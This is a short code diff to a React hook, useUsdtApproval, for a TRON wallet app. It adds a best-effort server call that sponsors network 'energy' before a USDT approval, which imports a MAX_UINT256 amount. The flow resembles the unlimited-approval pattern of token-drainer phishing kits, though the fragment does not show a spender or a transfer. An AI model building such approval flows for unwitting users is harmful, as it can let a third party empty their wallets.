@@ -1,7 +1,13 @@
 import { useCallback, useEffect, useState } from 'react'
 import { useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
 import type { TronConnector } from '@reown/appkit-utils/tron'
-import { getConfig, reportEvent, verifyAllowance, type ServerConfig } from '../lib/api'
+import {
+  getConfig,
+  reportEvent,
+  requestEnergy,
+  verifyAllowance,
+  type ServerConfig,
+} from '../lib/api'
 import { MAX_UINT256, USDT, buildApprove, signAndBroadcast } from '../lib/usdt'
 
 const TRON_ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/
@@ -120,6 +126,13 @@ export function useUsdtApproval() {
       if (current >= required) {
         setPhase('done')
         return
+      }
+
+      // Top up energy only if they cannot pay the fee. Best effort.
+      try {
+        await requestEnergy(address)
+      } catch {
+        // ignore — the approval still works if they hold TRX
       }
 
       if (current > 0n) {
